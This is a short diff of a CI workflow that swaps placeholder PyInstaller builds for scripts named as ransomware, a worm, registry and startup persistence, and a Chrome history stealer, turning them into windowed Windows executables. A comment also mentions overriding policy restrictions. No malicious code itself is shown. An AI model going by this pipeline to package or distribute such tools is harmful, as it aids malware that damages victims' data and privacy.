@@ -36,11 +36,11 @@ jobs:
     - name: Build Executables with PyInstaller
       shell: powershell
       run: |
-        pyinstaller --onefile --windowed a/a.py
-        pyinstaller --onefile --windowed b/b.py
-        pyinstaller --onefile --windowed c/c.py
-        pyinstaller --onefile --windowed d/d.py
-        pyinstaller --onefile --windowed e/e.py
+        pyinstaller --onefile --windowed Ransomware/ransomware.py
+        pyinstaller --onefile --windowed Spreading/worm2.py
+        pyinstaller --onefile --windowed Startup/addtoregistrykey.py
+        pyinstaller --onefile --windowed Startup/addtostartup.py
+        pyinstaller --onefile --windowed Stealing/gethistoryChrome.py
 
     # Step 5: Override policy restrictions, install ps2exe, and compile PowerShell scripts
     - name: Install ps2exe and Build PowerShell EXEs
